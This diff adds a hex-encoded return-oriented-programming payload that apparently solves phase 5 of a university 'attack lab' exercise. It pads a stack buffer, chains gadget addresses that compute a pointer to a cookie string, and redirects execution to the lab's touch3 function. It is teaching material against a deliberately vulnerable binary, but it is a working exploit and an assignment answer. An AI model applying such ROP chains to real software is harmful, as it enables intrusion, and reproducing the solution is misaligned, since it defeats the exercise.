@@ -1,0 +1,24 @@
+/* Code Injection for Phase 5 */
+/* As always, pad buffer to end */
+
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+41 41 41 41 41 41 41 41
+
+/* Gadgets from start_farm to end_farm */
+/* Note that movl instructions set highest-order 4 bytes to 0 */
+a3 1b 40 00 00 00 00 00		/* 1: movq %rsp,%rax */
+2d 1b 40 00 00 00 00 00 	/* 2: movq %rax,%rdi */
+36 1b 40 00 00 00 00 00		/* 3: popq %rax */
+48 00 00 00 00 00 00 00 	/* Offset from %rsp for cookie string */
+e2 1b 40 00 00 00 00 00		/* 4: movl %eax,%edx */
+c5 1b 40 00 00 00 00 00 	/* 5: movl %edx,%ecx */
+6c 1b 40 00 00 00 00 00         /* 6: movl %ecx,%esi */
+4c 1b 40 00 00 00 00 00 	/* 7: add_xy(%rdi,%rsi) */
+2d 1b 40 00 00 00 00 00		/* 8: movq %rax,%rdi  */
+74 1a 40 00 00 00 00 00		/* Addr. of touch3 */
+
+/* Finally pass in string representation of our cookie */
+37 30 32 30 36 62 37 37 00
